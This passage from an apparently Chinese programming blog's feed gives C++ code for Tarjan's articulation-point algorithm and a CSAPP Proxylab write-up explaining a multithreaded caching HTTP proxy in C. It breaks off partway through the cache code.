class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by raven on 2020/9/20.</span></span><br><span class="line"><span class="comment"> * 求解连通图的关键点</span></span><br><span class="line"><span class="comment"> * 书上讲解得不好</span></span><br><span class="line"><span class="comment"> * 讲解参考：https://www.cnblogs.com/nullzx/p/7968110.html</span></span><br><span class="line"><span class="comment"> * 输入： tarjan_input.txt 采用邻接链表表示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; visited;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dfn;         <span class="comment">/*第一次访问到第idx个节点时的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; low;         <span class="comment">/*第idx个节点及其子树能够回溯到的最小节点处的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; parent;      <span class="comment">/*第idx个节点的父亲节点*/</span></span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; joint_node;     <span class="comment">/* 关节点 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_link_graph</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;link_graph)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; link_graph.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">" connect to "</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; link_graph[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; link_graph[i][j] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">create_link_graph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">string</span> <span class="title">path</span><span class="params">(<span class="string">"/home/raven/Projects/Clion/MyLeetCode/0.数据结构/6.图/tarjan_input3.txt"</span>)</span></span>;</span><br><span class="line">    <span class="function">ifstream <span class="title">fin</span><span class="params">(path)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!fin.is_open()) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> node_num;</span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">line</span>;</span><br><span class="line">    fin &gt;&gt; node_num;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">link_graph</span><span class="params">(node_num, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;())</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (getline(fin, <span class="built_in">line</span>)) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> i = <span class="built_in">line</span>.find_first_of(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="built_in">std</span>::<span class="built_in">string</span>::npos) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> num_str = <span class="built_in">line</span>.substr(<span class="number">0</span>, i); <span class="comment">/* 序号 */</span></span><br><span class="line">        <span class="built_in">string</span> connect_node = <span class="built_in">line</span>.substr(i + <span class="number">1</span>, <span class="built_in">line</span>.<span class="built_in">size</span>() - i);   <span class="comment">/* 想连接的点 */</span></span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream1</span><span class="params">(num_str)</span></span>;</span><br><span class="line">        sstream1 &gt;&gt; i;</span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream2</span><span class="params">(connect_node)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 初始化与 i 相连的node */</span></span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line">        <span class="keyword">while</span> (sstream2 &gt;&gt; temp) &#123;</span><br><span class="line">            link_graph[i].push_back(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> link_graph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;link_graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;       <span class="comment">/* 时间戳 */</span></span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!visited[cur_node]) &#123;     <span class="comment">/* 深入到子树 */</span></span><br><span class="line">        visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">        dfn[cur_node] = ++counter;</span><br><span class="line">        low[cur_node] = dfn[cur_node];</span><br><span class="line">        parent[cur_node] = from_node;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* dfs from "cur_node" */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> connected_node: link_graph[cur_node]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (connected_node == parent[cur_node]) <span class="keyword">continue</span>;    <span class="comment">/* 去掉直接相邻parent回边 */</span></span><br><span class="line"></span><br><span class="line">            dfs(link_graph, cur_node, connected_node);</span><br><span class="line">            <span class="comment">/* 从dfs回来后，已经求解到子树能够回溯到的最小节点 */</span></span><br><span class="line">            <span class="keyword">if</span> (low[connected_node] &lt; dfn[cur_node] &amp;&amp;           <span class="comment">/* 子树回边到的最小节点在本节点之上 */</span></span><br><span class="line">                low[connected_node] != dfn[parent[cur_node]]) &#123;  <span class="comment">/* 保证子树回边到的最小节点不是本节点的parent节点 */</span></span><br><span class="line">                low[cur_node] = <span class="built_in">min</span>(low[cur_node],low[connected_node]);</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> (low[connected_node] &gt; dfn[cur_node]) &#123;</span><br><span class="line">                joint_node.insert(cur_node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;          <span class="comment">/* 回边 */</span></span><br><span class="line">        <span class="keyword">if</span> (cur_node != parent[from_node] &amp;&amp; dfn[cur_node] &lt; low[from_node]) &#123;</span><br><span class="line">            low[from_node] = dfn[cur_node];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* create graph from the input file */</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;&amp;link_graph = create_link_graph();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print result */</span></span><br><span class="line">    print_link_graph(link_graph);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* initialize global vars */</span></span><br><span class="line">    visited.resize(link_graph.<span class="built_in">size</span>());</span><br><span class="line">    dfn.reserve(link_graph.<span class="built_in">size</span>());</span><br><span class="line">    low.reserve(link_graph.<span class="built_in">size</span>());</span><br><span class="line">    parent.reserve(link_graph.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* tarjan algorithm */</span></span><br><span class="line">    <span class="comment">/* start from node 0 */</span></span><br><span class="line">    visited[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    dfn[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    low[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    parent[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* root node单独处理 */</span></span><br><span class="line">    <span class="keyword">int</span> child_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> connected_node : link_graph[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[connected_node])&#123;</span><br><span class="line">            child_num++;</span><br><span class="line">            dfs(link_graph, <span class="number">0</span>, connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(child_num&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">            joint_node.insert(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print answer */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> node : joint_node)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"joint node "</span> &lt;&lt; node &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h2><ol><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbnVsbHp4L3AvNzk2ODExMC5odG1s" title="https://www.cnblogs.com/nullzx/p/7968110.html">Tarjan算法：求解图的割点与桥（割边）<i class="fa fa-external-link"></i></span></li><li><a href="">数据结构(C语言版本)</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天来说说tarjan算法，一种用于求解连通图的关键点算法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode" scheme="https://www.ravenxrz.ink/categories/LeetCode/"/>
    
    
  </entry>
  
  <entry>
    <title>Csapp-Proxylab题解</title>
    <link href="https://www.ravenxrz.ink/archives/5d2f135a.html"/>
    <id>https://www.ravenxrz.ink/archives/5d2f135a.html</id>
    <published>2020-09-06T04:27:25.000Z</published>
    <updated>2020-09-06T07:50:50.929Z</updated>
    
    <content type="html"><![CDATA[<p>本次lab Proxylab。 也是csapp的最后一个lab。</p><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h2><p>proxylab, 从最终目的来看，我们实现的是一个代理服务器。proxy接收来client的请求，转发给server，并从server中取得数据后，返回给client。另外，proxy从server中取回数据后还需要做cache，这样，当另一个client请求相同的数据时，就不用从server端请求数据，降低了server的压力。</p><p>再看看一些细节的要求，要求支持多线程请求，多线程涉及一些同步的问题，所以做的时候一定要考虑哪些是互斥资源，用什么方式同步等。</p><a id="more"></a><h2 id="2-个人实现"><a href="#2-个人实现" class="headerlink" title="2.个人实现"></a>2.个人实现</h2><p>下面是整个处理流程图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200906094312362.png" alt="image-20200906094312362"></p><p>client向proxy请求数据，proxy将请求放入到一个任务队列中，交由子线程处理。线程负责参数解析，首先看cache中是否有满足的数据，有则直接返回给client，没有则向server请求，server返回数据后，线程将数据插入到cache中，并返回给client。</p><p>ok，整个处理流程知道后就可以开始写代码了。</p><p><strong>下文不会给出所有代码，具体代码已贴github:</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWJvb2tzLXNvdXJjZS1jb2Rlcy9jc2FwcF9sYWIvYmxvYi9tYXN0ZXIvcHJveHlsYWIvcHJveHlsYWItaGFuZG91dC9wcm94eS5j" title="https://github.com/raven-books-source-codes/csapp_lab/blob/master/proxylab/proxylab-handout/proxy.c">proxy.c<i class="fa fa-external-link"></i></span></p><h3 id="1-主线程工作"><a href="#1-主线程工作" class="headerlink" title="1. 主线程工作"></a>1. 主线程工作</h3><p>先看看主线程做的工作，主线程的工作相对简单，除了一些必要的初始化工作外，只需要开启socket监听，一旦有新连接就将该连接的文件描述符(fd)放入到任务队列中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> proxy_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> client_hostname[BUF_SIZE];</span><br><span class="line">    <span class="keyword">char</span> client_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* init */</span></span><br><span class="line">    log_set_level(LOG_INFO);</span><br><span class="line">    sbuf_init(&amp;sbuf, WORKER_NUM * <span class="number">3</span>);</span><br><span class="line">    cache_init(&amp;mycache);</span><br><span class="line">    create_thread_workers(WORKER_NUM);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* parse port from cmd */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        log_error(<span class="string">"need specify proxy port\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(proxy_port, argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* start listen */</span></span><br><span class="line">    listenfd = Open_listenfd(proxy_port);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *) &amp;clientaddr, &amp;clientlen);</span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, client_hostname, BUF_SIZE,</span><br><span class="line">                    client_port, BUF_SIZE, <span class="number">0</span>);</span><br><span class="line">        log_info(<span class="string">"Accepted connection from (%s, %s)\n"</span>, client_hostname,</span><br><span class="line">                 client_port);</span><br><span class="line">        <span class="comment">/* put task into task queue */</span></span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free resource  */</span></span><br><span class="line">    cache_deinit(&amp;mycache);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-子线程工作"><a href="#2-子线程工作" class="headerlink" title="2. 子线程工作"></a>2. 子线程工作</h3><p>子线程从任务队列中获取一个“任务“，然后doit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">thread_routinue</span><span class="params">(<span class="keyword">void</span> *vargs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> connfd;</span><br><span class="line">    pthread_detach(pthread_self());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">        doit(connfd);</span><br><span class="line">        <span class="built_in">close</span>(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doit就复杂些了，因为基本包含了所有工作：</p><ol><li>负责获取client请求</li><li>解析client请求</li><li>转换成可以发送给server的请求</li><li>获取数据，可能从cache中获取，也可能从server中获取</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> src_uri[BUF_SIZE], dest_uri[BUF_SIZE], src_version[BUF_SIZE],</span><br><span class="line">            dest_version[BUF_SIZE], src_headers[BUF_SIZE], dest_headers[BUF_SIZE],</span><br><span class="line">            hostname[BUF_SIZE], server_port[BUF_SIZE];</span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * BUF_SIZE);</span><br><span class="line">    <span class="keyword">char</span> *request_to_server = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * BUF_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!buf || !request_to_server) &#123;</span><br><span class="line">        log_error(</span><br><span class="line">                <span class="string">"allocate memory for request which is sending to server faild\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* init */</span></span><br><span class="line">    <span class="built_in">memset</span>(src_uri, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(src_version, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(src_headers, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(hostname, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(request_to_server, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(server_port, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* parse request from client */</span></span><br><span class="line">    <span class="keyword">if</span> (parse_client_request(fd, src_uri, src_version, src_headers, hostname,</span><br><span class="line">                             server_port)) &#123;</span><br><span class="line">        log_error(<span class="string">"parse client request error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log_info(<span class="string">"request: %s\n"</span>, src_uri);</span><br><span class="line">    log_info(<span class="string">"http version: %s\n"</span>, src_version);</span><br><span class="line">    log_info(<span class="string">"headers: %s\n"</span>, src_headers);</span><br><span class="line">    log_info(<span class="string">"hostname: %s\n"</span>, hostname);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* convert uri , headers, version to the uri headers version that will be</span></span><br><span class="line"><span class="comment">     * send to server */</span></span><br><span class="line">    <span class="comment">/* append HOSTNAME first */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Host: %s\r\n"</span>, hostname);</span><br><span class="line">    <span class="built_in">strcat</span>(src_headers, buf);</span><br><span class="line">    <span class="keyword">if</span> (convert_request(src_uri, src_headers, src_version, dest_uri,</span><br><span class="line">                        dest_headers, dest_version)) &#123;</span><br><span class="line">        log_error(<span class="string">"convert request failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* constrcut request sending to server */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"GET %s %s\r\n"</span>, dest_uri, dest_version);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, buf);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, dest_headers);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, <span class="string">"\r\n"</span>); <span class="comment">/* end of requst */</span></span><br><span class="line">    log_info(<span class="string">"coneverted request to server:\n%s\n"</span>, request_to_server);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* fetch data  */</span></span><br><span class="line">    <span class="comment">/* is data in cache? */</span></span><br><span class="line">    cache_item *ci;</span><br><span class="line">    ci = cache_get(&amp;mycache, dest_uri);</span><br><span class="line">    <span class="keyword">int</span> read_len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (ci == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* fetch from server*/</span></span><br><span class="line">        <span class="keyword">if</span> ((read_len = fetch_data_from_server(request_to_server,</span><br><span class="line">                                               <span class="built_in">strlen</span>(request_to_server) + <span class="number">1</span>,</span><br><span class="line">                                               hostname, server_port, buf)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            log_error(<span class="string">"fetch data from server failed\n"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        log_info(<span class="string">"fetch data from server sucess %d\n"</span>, read_len);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* save to cache */</span></span><br><span class="line">        log_debug(<span class="string">"put data into cache\n"</span>);</span><br><span class="line">        cache_put(&amp;mycache, dest_uri, buf, read_len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* fetch from cache */</span></span><br><span class="line">        log_debug(<span class="string">"fetch data from cache\n"</span>);</span><br><span class="line">        read_len = ci-&gt;effect_size;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, ci-&gt;data, read_len);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* send data to client */</span></span><br><span class="line">    <span class="keyword">int</span> write_len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((write_len = send_data_to_client(fd, buf, read_len)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        log_error(<span class="string">"send data to client failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log_info(<span class="string">"send data to client sucess %d\n"</span>, write_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free resource */</span></span><br><span class="line">    <span class="built_in">free</span>(request_to_server);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个流程就是这样，处理起来不算来。下面我们主要看看整个流程中设计到的一些互斥资源。</p><ol><li>sbuf，互斥队列，这个是csapp提供了，我们可以直接用，内部采用“生产者-消费者”的思想+信号量的实现。</li><li>cache，典型的”读写锁“实现，个人这里采用的是写优先的读写锁信号量实现。</li></ol><h3 id="3-cache的实现"><a href="#3-cache的实现" class="headerlink" title="3. cache的实现"></a>3. cache的实现</h3><p>那下面就说一下cache的实现吧。</p><p>文中定义了cache的最大size和一个object的最大size。为了简单起见，我们按照max object size来分块，然后采用LRU算法来替换cache block。</p><p>首先看看用到的数据结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">   <span class="keyword">char</span> key[<span class="number">100</span>] ;     <span class="comment">/* use request uri as key */</span></span><br><span class="line">   <span class="keyword">char</span> data[MAX_OBJECT_SIZE];</span><br><span class="line">   <span class="keyword">size_t</span> effect_size;      <span class="comment">/* effect size */</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> <span 